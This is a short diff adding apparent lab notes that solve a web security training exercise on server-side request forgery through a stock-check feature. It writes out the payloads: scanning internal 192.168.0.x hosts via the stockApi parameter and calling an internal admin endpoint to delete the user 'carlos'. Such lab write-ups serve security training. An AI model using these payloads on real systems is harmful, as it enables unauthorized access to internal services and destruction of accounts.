@@ -1,0 +1,16 @@
+Basic SSRF against another back-end system
+Vulnerable feature - stock check functionality
+
+1)
+-Check stock on an item
+-Send post to intruder
+-stockApi=http://192.168.0.1:8080/admin
+-Mark 1
+-Payloads numbers, 1-255
+-Start
+-> 224
+
+2)
+-Send post to repeater
+-Make stockAPI=http://192.168.0.224:8080/admin/delete?username=carlos
+-Send
